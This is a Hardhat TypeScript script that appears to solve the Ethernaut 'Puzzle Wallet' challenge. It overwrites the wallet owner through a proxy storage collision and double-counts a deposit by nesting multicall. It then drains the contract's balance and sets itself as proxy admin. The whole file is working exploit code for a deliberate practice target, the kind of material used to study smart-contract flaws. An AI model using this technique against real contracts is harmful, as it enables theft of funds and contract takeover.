import { BigNumber } from "ethers";
import { ethers } from "hardhat";
import * as helper from "./helpful_scripts";

async function main() {
    const [account] = await ethers.getSigners();
    const puzzle = await helper.getContractAt("PuzzleWallet", "0x474Ff37582D420ef54161E0832f944FEbEb62e6E");
    const proxy = await helper.getContractAt("PuzzleProxy", "0x474Ff37582D420ef54161E0832f944FEbEb62e6E");

    await helper.waitForTx(proxy.proposeNewAdmin(account.address));
    await helper.waitForTx(puzzle.addToWhitelist(account.address));

    const deposit = puzzle.interface.encodeFunctionData("deposit");
    const mulitcall = puzzle.interface.encodeFunctionData("multicall", [[deposit]]);

    const data = [deposit, mulitcall];

    await helper.waitForTx(puzzle.multicall(data, {
        value: await helper.provider.getBalance(proxy.address),
        gasLimit: 10000000
    }));

    await helper.waitForTx(puzzle.execute(account.address, 2000000000000000, []));

    await helper.waitForTx(puzzle.setMaxBalance(BigNumber.from(account.address)));

    console.log(await proxy.admin());
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });